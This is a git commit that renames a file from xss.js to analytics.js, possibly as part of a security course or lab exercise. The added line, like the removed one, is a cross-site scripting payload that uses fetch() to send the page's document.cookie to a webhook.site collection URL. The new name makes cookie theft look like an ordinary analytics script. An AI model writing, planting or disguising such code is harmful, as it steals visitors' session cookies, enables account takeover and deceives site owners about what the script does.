4fa81c476746fe4b55eaf183f8f24f0c74684263
z5358480 <z5358480@ad.unsw.edu.au>
2026-04-21 16:19:27 +1000

    Update and rename xss.js to analytics.js

---
+++ analytics.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/5a6aff69-95db-43f0-bda7-1d8516507c1a?cookie='+document.cookie)
--- xss.js
+++
@@ -1,1 +0,0 @@
-fetch('https://webhook.site/680432f7-7814-46da-a254-5cab61e4af35?cookie='+document.cookie)
